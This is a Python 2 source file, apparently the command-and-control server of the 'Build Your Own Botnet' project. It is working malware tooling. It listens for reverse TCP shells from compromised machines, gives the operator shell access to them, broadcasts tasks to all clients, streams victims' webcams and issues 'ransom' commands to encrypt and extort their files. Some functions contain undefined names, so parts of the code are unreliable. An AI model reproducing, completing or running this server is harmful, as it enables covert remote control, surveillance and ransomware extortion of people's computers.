#!/usr/bin/python
# -*- coding: utf-8 -*-
""" 
Command & Control (Build Your Own Botnet)

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""

# standard library
import os
import sys
import time
import json
import Queue
import pickle
import socket
import struct
import base64
import random
import logging
import argparse
import datetime
import threading
import subprocess
import collections

# packages
try:
    import cv2
except ImportError:
    pass
try:
    import colorama
    colorama.init(autoreset=False)
except:
    pass

# modules
from core import *

# globals
packages = ['cv2','colorama']
platforms = ['win32','linux2','darwin']
missing = []

# setup
util.is_compatible(platforms, __name__)
for __package in packages:
    try:
        exec("import {}".format(__package), globals())
    except ImportError:
        util.debug("missing required package '{}'".format(__package))
        missing.append(__package)

# fix missing dependencies
if missing:
    proc = subprocess.Popen('{} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
    proc.wait()
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

# globals
__threads = {}
__abort = False
__debug = bool('--debug' in sys.argv)
__logger = logging.getLogger('SERVER')
logging.basicConfig(level=logging.DEBUG if globals()['__debug'] else logging.INFO, handler=logging.StreamHandler())

def main():
    parser = argparse.ArgumentParser(
        prog='server.py',
        version='0.1.4',
        description="Command & Control Server (Build Your Own Botnet)")

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--db',
        action='store',
        type=str,
        default='database.db',
        help='SQLite database')

    options = parser.parse_args()
    globals()['resource_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=os.path.abspath('modules'), shell=True)
    globals()['c2'] = C2(host=options.host, port=options.port, db=options.db)
    c2.run()

class C2():
    """ 
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients
    
    """
    _lock = threading.Lock()
    _text_color = 'RED'
    _text_style = 'DIM'
    _prompt_color = 'RESET'
    _prompt_style = 'BRIGHT'

    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        """ 
        Create a new Command & Control server

        `Optional`
        :param str db:      SQLite database
                                :memory: (session)
                                *.db     (persistent)

        Returns a byob.server.C2 instance
        
        """
        self._active = threading.Event()
        self._count = 1
        self._prompt = None
        self._database = db
        self.current_session = None
        self.sessions = {}
        self.socket = self._socket()
        self.banner = self._banner()
        self.commands = {
            'set' : self.set,
            'help' : self.help,
            'exit' : self.quit,
            'quit' : self.quit,
            '$' : self.eval,
            'eval' : self.eval,
            'debug' : self.eval,
            'db' : self.query,
            'query' : self.query,
            'database' : self.query,
            'options' : self.settings,
            'settings' : self.settings,
            'sessions' : self.session_list,
            'clients' : self.session_list,
            'shell' : self.session_shell,
            'ransom' : self.session_ransom,
            'webcam' : self.session_webcam,
            'kill' : self.session_remove,
            'drop' : self.session_remove,
            'back' : self.session_background,
            'bg' : self.session_background,
            'background' : self.session_background,
            'sendall' : self.task_broadcast,
            'broadcast' : self.task_broadcast,
            'results' : self.task_list,
            'tasks' : self.task_list}

    def _error(self, data):
        lock = self.current_session.lock if self.current_session else self._lock
        with lock:
            util.display('[-] ', color='red', style='dim', end=',')
            util.display('Server Error: {}\n'.format(data), color='reset', style='dim')

    def _print(self, info):
        lock = self._lock if not self.current_session else self.current_session._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys  = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        util.display('\x20' * 4, end=',')
                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                util.display('\x20' * 4, end=',')
                util.display(str(info), color=self._text_color, style=self._text_style)

    def _socket(self, port=1337):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(100)
        return s

    def _return(self, data=None):
        lock, prompt = (self.current_session.lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                util.display('\n{}\n'.format(data))
            else:
                util.display(prompt, end=',')

    def _banner(self):
        try:
            banner = __doc__ if __doc__ else "Command & Control Server (Build Your Own Botnet)"
            with self._lock:
                util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
                util.display("[?] ", color='yellow', style='bright', end=',')
                util.display("Hint: show usage information with the 'help' command\n", color='reset', style='dim')
            return banner
        except Exception as e:
            self._error(str(e))

    def _get_arguments(self, data):
        args = tuple([i for i in data.split() if '=' not in i])
        kwds = dict({i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i})
        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)

    def _get_sessions(self):
        return [v for v in self.sessions.values()]

    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            self._error("Invalid Client ID")
        return session

    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            _addr = connection.getpeername()
            for s in self.get_sessions():
                if s.connection.getpeername() == _addr:
                    session = c
                    break
        else:
            self._error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())

    def eval(self, code):
        """ 
        Runs code in context of the server

        `Requires`
        :param str code:    Python code to execute
        
        """
        if globals()['__debug']:
            try:
                print eval(code)
            except Exception as e:
                self._error("Error: %s" % str(e))
        else:
            self._error("Debugging mode is disabled")

    def quit(self):
        """ 
        Quit server and optionally keep clients alive
        
        """
        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for session in self._get_sessions():
                session._active.set()
                self.send('mode passive', session=session.id)
        globals()['__abort'] = True
        self._active.clear()
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        self.display('Exiting...')
        sys.exit(0)

    def help(self, info=None):
        """ 
        Show usage information

        `Optional`
        :param dict info:   client usage help
        
        """
        column1 = 'command <arg>'
        column2 = 'description'
        info = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "show current settings", "set <option>=[value]": "change settings/options"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        util.display('\n', end=',')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        util.display("\n", end=',')

    def display(self, info):
        """ 
        Display formatted output in the console

        `Required`
        :param str info:   text to display

        """
        with self._lock:
            util.display('\n')
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self.display(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            else:
                self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))

    def query(self, statement):
        """ 
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute

        """
        self.database.execute_query(statement, returns=False, display=True)

    def settings(self):
        """
        Show the server's currently configured settings
        
        """
        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
        util.display('\n\t    SETTINGS', color='reset', style='bright')
        util.display('\ttext color/style', color=self._text_color, style=self._text_style)
        util.display('\tprompt color/style', color=self._prompt_color, style=self._prompt_style)
        util.display('\tdebug: {}\n'.format('true' if globals()['__debug'] else 'false'), color='reset', style='dim')

    def set(self, args=None):
        """ 
        Set display settings for the command & control console

        Usage: `set [setting] [option]=[value]`

            :setting text:      text displayed in console
            :setting prompt:    prompt displayed in shells

            :option color:      color attribute of a setting
            :option style:      style attribute of a setting

            :values color:      red, green, cyan, yellow, magenta
            :values style:      normal, bright, dim

        Example 1:         `set text color=green style=normal`
        Example 2:         `set prompt color=white style=bright`

        """
        if args:
            arguments = self._get_arguments(args)
            args, kwargs = arguments.args, arguments.kwargs
            if arguments.args:
                target = args[0]
                args = args[1:]
                if target in ('debug','debugging'):
                    if args:
                        setting = args[0]
                        if setting.lower() in ('0','off','false','disable'):
                            globals()['__debug'] = False
                        elif setting.lower() in ('1','on','true','enable'):
                            globals()['__debug'] = True
                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='dim', end=',')
                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='reset', style='bright')
                        return
                for setting, option in arguments.kwargs.items():
                    option = option.upper()
                    if target == 'prompt':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._prompt_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._prompt_style = option
                        util.display("\nprompt color/style changed to ", color='reset', style='bright', end=',')
                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                        return
                    elif target == 'text':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._text_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._text_style = option
                        util.display("\ntext color/style changed to ", color='reset', style='bright', end=',')
                        util.display(option + '\n', color=self._text_color, style=self._text_style)
                        return
        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)

    def task_handler(self):
        """ 
        Loop through active sessions, passing the tasks completed by 
        each client to the database for tracking and/or storage

        """
        for session_id, session in self.sessions.items():
            while True:
                try:
                    task = session.tasks.get_nowait()
                    self.database.handle_task(task)
                except Exception as e:
                    break

    def task_list(self, id=None):
        """ 
        List client tasks and results

        `Requires`
        :param int id:   session ID
        
        """
        if id:
            session = self._get_session_by_id(id)
            if session:
                return self.database.get_tasks(session.info.get('uid'))
        return self.database.get_tasks()

    def task_broadcast(self, command):
        """ 
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast

        """
        for session in self._get_sessions():
            self.send(command, session=session.id)

    def session_webcam(self, args=''):
        """ 
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video

        """
        if not self.current_session:
            self._error( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = 'webcam stream {}'.format(port)
                    self.send(cmd, session.id)
                    conn, addr = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                result = 'Webcam stream ended'
        else:
            self.send("webcam %s" % args, session.id)
            task = self.recv(id=session.id)
            result = task.get('result')
        self.display(result)

    def session_remove(self, session):
        """ 
        Shutdown client shell and remove client from database

        `Requires`
        :param int session:   session ID

        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            return
        else:
            session = self.sessions[int(session)]
            session._active.clear()
            self.send('kill', session=session)
            try:
                session.connection.close()
            except: pass
            try:
                session.connection.shutdown()
            except: pass
            _ = self.sessions.pop(int(session), None)
            del _
            util.display(self._text_color + self._text_style)
            if not self.current_session:
                with self._lock:
                    util.display('Client {} disconnected'.format(session))
                self._active.set()
                session._active.clear()
                return self.run()
            elif int(session) == self.current_session.session:
                with self.current_session._lock:
                    util.display('Client {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()
            else:
                with self._lock:
                    util.display('Client {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()

    def session_list(self, verbose=True):
        """ 
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)

        """
        lock = self._lock if not self.current_session else self.current_session._lock
        with lock:
            sessions = self.database.get_sessions(verbose=verbose, display=True)

    def session_ransom(self, args=None):
        """ 
        Encrypt and ransom files on client machine

        `Required`
        :param str args:    encrypt, decrypt, payment

        """
        if self.current_session:
            if 'decrypt' in str(args):
                self.send("ransom decrypt %s" % key.exportKey(), session=self.current_session.session)
            elif 'encrypt' in str(args):
                self.send("ransom %s" % args, session=self.current_session.session)
            else:
                self._error("Error: invalid option '%s'" % args)
        else:
            self._error("No client selected")

    def session_shell(self, session):
        """ 
        Interact with a client session through a reverse TCP shell

        `Requires`
        :param int session:   session ID

        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            self._error("Session '{}' does not exist".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\t[+] ", color='cyan', style='bright', end=',')
            util.display("Client {} selected\n".format(self.current_session.id), color='reset', style='dim')
            self.current_session._active.set()
            return self.current_session.run()

    def session_background(self, session=None):
        """ 
        Send a session to background

        `Requires`
        :param int session:   session ID

        """
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()

    @util.threaded
    def serve_until_stopped(self):
        self.database = database.Database(self._database)
        while True:
            connection, address = self.socket.accept()
            session = Session(connection=connection, id=self._count)
            info = self.database.handle_session(session.info)
            if isinstance(info, dict):
                session.info = info
            self.sessions[self._count] = session
            self.sessions[self._count].start()
            self._count += 1
            util.display("\n\n\t[+]", color='green', style='bright', end=',')
            util.display("New Connection:", color='reset', style='bright', end=',')
            util.display(address[0], color='reset', style='dim')
            util.display("\t    Session:", color='reset', style='bright', end=',')
            util.display(str(self._count), color='reset', style='dim')
            util.display("\t    Started:", color='reset', style='bright', end=',')
            util.display(time.ctime(session._created), color='reset', style='dim')
            util.display("\t    Key:", color='reset', style='bright', end=',')
            util.display(base64.b64encode(session.key), color='reset', style='dim')
            util.display("\t    Info:", color='reset', style='bright')
            self.display(session.info)
            prompt = self.current_session._prompt if self.current_session else self._prompt
            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
            abort = globals()['__abort']
            if abort:
                break

    def run(self):
        """ 
        Run a shell on local host

        """
        self._active.set()
        if 'c2_server' not in globals()['__threads']:
            globals()['__threads']['c2_server'] = self.serve_until_stopped()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer = self._get_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                        except Exception as e1:
                            output = str(e1)
                    elif cmd == 'cd':
                        try:
                            os.chdir(action)
                        except: pass
                    else:
                        try:
                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                        except: pass
                    if output:
                        self.display(str(output))
                if globals()['__abort']:
                    break
            except KeyboardInterrupt:
                self._active.clear()
                break
        self.quit()


class Session(threading.Thread):
    """ 
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session 
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=1):
        """
        Create a new Session 

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(Session, self).__init__()
        self._prompt = None
        self._active = threading.Event()
        self._created = time.time()
        self.connection = connection
        self.tasks = Queue.Queue()
        self.id = id
        self.key = security.diffiehellman(self.connection)
        self.info = self.client_info()

    def kill(self):
        """ 
        Kill the reverse TCP shell session

        """
        self._active.clear()
        globals()['c2'].session_remove(self.id)
        globals()['c2'].current_session = None
        globals()['c2']._active.set()
        globals()['c2'].run()

    def client_info(self):
        """
        Get information about the client host machine
        to identify the session
        
        """
        header_size = struct.calcsize("L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack(">L", header)[0]
        msg = self.connection.recv(msg_size)
        text = security.decrypt_aes(msg, self.key)
        info = json.loads(text)
        return info

    def status(self):
        """ 
        Check the status and duration of the session
        
        """
        c = time.time() - float(self._created)
        data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, task):
        """ 
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True

    def recv_task(self):
        """ 
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """
        hdr_len = struct.calcsize('!L')
        hdr = self.connection.recv(hdr_len)
        msg_len = struct.unpack('!L', hdr)[0]
        msg = self.connection.recv(msg_len)
        data = security.decrypt_aes(msg, self.key)
        return json.loads(data)

    def run(self):
        """ 
        Handle the server-side of the session's reverse TCP shell

        """
        while True:
            try:
                if self._active.wait():
                    task = globals()['c2'].recv_task() if not self._prompt else self._prompt
                    if 'help' in task.get('task'):
                        self._active.clear()
                        globals()['c2'].help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):
                        self._prompt = task
                        command = self._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in globals()['c2'].commands and cmd != 'help':
                            result = globals()['c2'].commands[cmd](action) if len(action) else globals()['c2'].commands[cmd]()
                            if result:
                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                globals()['c2'].display(result)
                                self.tasks.put_nowait(task)
                            continue
                        else:
                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                            globals()['c2'].send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['c2'].display(task.get('result'))
                            self.tasks.put_nowait(task)
                    else:
                        if self._abort:
                            break
                    self._prompt = None
            except Exception as e:
                globals()['c2']._error(str(e))
                time.sleep(1)
                break
        self._active.clear()
        globals()['c2']._return()


if __name__ == '__main__':
    main()
